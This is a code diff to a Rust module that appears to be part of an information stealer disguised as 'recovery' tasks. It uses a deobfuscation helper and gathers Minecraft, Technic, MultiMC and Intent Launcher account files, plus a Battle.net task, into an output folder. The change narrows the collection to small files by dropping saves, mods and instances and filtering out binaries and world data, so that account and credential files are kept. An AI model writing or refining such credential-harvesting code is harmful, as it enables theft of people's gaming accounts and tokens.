@@ -1,7 +1,7 @@
 use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::{
     context::RecoveryContext,
-    fs::{copy_dir_limited, copy_file, copy_named_dir, sanitize_label},
+    fs::{copy_dir_filtered, copy_dir_limited, copy_file, copy_named_dir, sanitize_label},
     task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
 };
 use async_trait::async_trait;
@@ -231,7 +231,6 @@ impl RecoveryTask for BattleNetTask {
 async fn gaming_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
     let folder = ctx
         .output_dir
-        .join("services")
         .join("Gaming")
         .join(sanitize_label(label));
     fs::create_dir_all(&folder).await?;
@@ -335,8 +334,26 @@ impl MinecraftTask {
         match fs::metadata(&entry.path).await {
             Ok(metadata) => match entry.kind {
                 MinecraftEntryKind::Directory if metadata.is_dir() => {
-                    copy_dir_limited(&entry.path, &dest, entry.label, artifacts, usize::MAX, 0)
-                        .await?;
+                    copy_dir_filtered(
+                        &entry.path,
+                        &dest,
+                        entry.label,
+                        artifacts,
+                        3,
+                        200,
+                        |name| {
+                            let lower = name.to_lowercase();
+                            !lower.ends_with(".mca")
+                                && !lower.ends_with(".dat")
+                                && !lower.ends_with(".jar")
+                                && !lower.ends_with(".class")
+                                && !lower.ends_with(".exe")
+                                && !lower.ends_with(".dll")
+                                && !lower.ends_with(".bin")
+                                && !lower.ends_with(".lck")
+                        },
+                    )
+                    .await?;
                 }
                 MinecraftEntryKind::File if metadata.is_file() => {
                     copy_file(entry.label, &entry.path, &dest, artifacts).await?;
@@ -382,12 +399,7 @@ fn build_minecraft_entries(ctx: &RecoveryContext) -> Vec<MinecraftEntry> {
             "Vanilla Accounts",
             app_data.join(".minecraft").join("launcher_accounts.json"),
         ),
-        MinecraftEntry::directory("Saves", app_data.join(".minecraft").join("saves")),
         MinecraftEntry::directory("Logs", app_data.join(".minecraft").join("logs")),
-        MinecraftEntry::directory(
-            "Crash Reports",
-            app_data.join(".minecraft").join("crash-reports"),
-        ),
         MinecraftEntry::file(
             "Intent Launcher",
             user_profile.join("intentlauncher").join("launcherconfig"),
@@ -476,18 +488,6 @@ fn build_minecraft_entries(ctx: &RecoveryContext) -> Vec<MinecraftEntry> {
             app_data.join(".technic").join("launcher_profiles.json"),
         ),
         MinecraftEntry::file("MultiMC", app_data.join("MultiMC").join("accounts.json")),
-        MinecraftEntry::directory(
-            "MultiMC Instances",
-            app_data.join("MultiMC").join("instances"),
-        ),
-        MinecraftEntry::directory(
-            "CurseForge Instances",
-            app_data
-                .join("curseforge")
-                .join("minecraft")
-                .join("Instances"),
-        ),
-        MinecraftEntry::directory("Forge Mods", app_data.join(".minecraft").join("mods")),
     ]
 }
 
